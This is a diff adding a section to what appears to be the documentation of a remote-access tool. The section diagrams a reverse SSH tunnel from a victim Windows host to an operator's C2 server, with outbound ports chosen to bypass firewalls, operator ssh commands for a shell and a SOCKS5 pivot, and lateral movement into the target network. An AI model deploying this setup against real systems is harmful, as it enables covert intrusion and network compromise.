@@ -184,6 +184,42 @@ sequenceDiagram
 
 > **How the operator finds the tunnel port:** When the target connects, the SSH client uses the Windows username and machine name as the SSH username in the format `<user>.<machine>.p<PORT>`. The C2 auth log shows this: `journalctl -u ssh | grep "Invalid user"`. The `.p<PORT>` suffix is the active tunnel port.
 
+### Tunnel Architecture
+
+Once the payload runs, the live network looks like this:
+
+```mermaid
+flowchart TB
+    Operator(["Operator"])
+
+    subgraph C2["VPS / C2 Server"]
+        C2_SSHD["sshd\nListening on 443 · 80 · 22"]
+        C2_Tunnel["Reverse Tunnel Port\n(e.g. 31332)\nForwards → Victim sshd"]
+        C2_SOCKS["SOCKS5 Proxy\n(e.g. port 1080)"]
+    end
+
+    subgraph Victim["Victim Windows Host"]
+        V_Client["ssh.exe\nOutbound SSH client"]
+        V_SSHD["sshd.exe\n127.0.0.1:31332"]
+    end
+
+    V_Client -- "① Outbound connection\nports 443 → 80 → 22 →...\n(bypasses inbound firewall)" --> C2_SSHD
+    C2_SSHD -- "Binds reverse tunnel" --> C2_Tunnel
+
+    Operator -- "② ssh -i operator_key\n-p 31332 user@c2" --> C2_Tunnel
+    C2_Tunnel -- "③ Tunneled shell\nthrough reverse tunnel" --> V_SSHD
+
+    Operator -- "④ ssh -D 1080\n-i operator_key\n-p 31332 user@c2" --> C2_SOCKS
+    C2_SOCKS -. "SOCKS5 pivot\nlateral movement into\ntarget network" .-> Victim
+```
+
+| Step | What happens |
+|------|-------------|
+| ① | Victim's `ssh.exe` calls home through whichever port the firewall allows (443 → 80 → 22 …) |
+| ② | Operator SSHes into the C2 on the dynamically assigned tunnel port to get a shell |
+| ③ | The C2 forwards the connection through the reverse tunnel to the victim's local `sshd` |
+| ④ | Operator opens a SOCKS5 proxy through the same tunnel for lateral movement into the target network |
+
 ---
 
 ## Payload Encryption
